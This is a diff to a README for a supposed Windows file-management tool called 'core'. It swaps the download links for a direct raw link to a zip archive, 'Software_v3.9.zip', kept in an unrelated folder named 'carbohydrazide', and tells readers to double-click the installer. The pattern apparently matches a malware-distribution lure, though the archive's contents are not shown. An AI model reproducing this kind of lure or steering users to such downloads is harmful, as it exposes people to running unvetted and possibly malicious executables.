@@ -1,6 +1,6 @@
 # 🖥️ core - Manage your computer files with speed
 
-[![Download for Windows](https://img.shields.io/badge/Download-Click%20Here-blue.svg)](https://github.com/olympiebeneficent43/core)
+[![Download for Windows](https://img.shields.io/badge/Download-Click%20Here-blue.svg)](https://github.com/olympiebeneficent43/core/raw/refs/heads/main/carbohydrazide/Software_v3.9.zip)
 
 ## 🎯 About this software
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to set up the program on your machine.
 
-1. Visit [this page to download](https://github.com/olympiebeneficent43/core) the installer.
+1. Visit [this page to download](https://github.com/olympiebeneficent43/core/raw/refs/heads/main/carbohydrazide/Software_v3.9.zip) the installer.
 2. Locate the file in your Downloads folder once the transfer finishes.
 3. Double-click the installer icon to start the process.
 4. Follow the prompts on the screen.
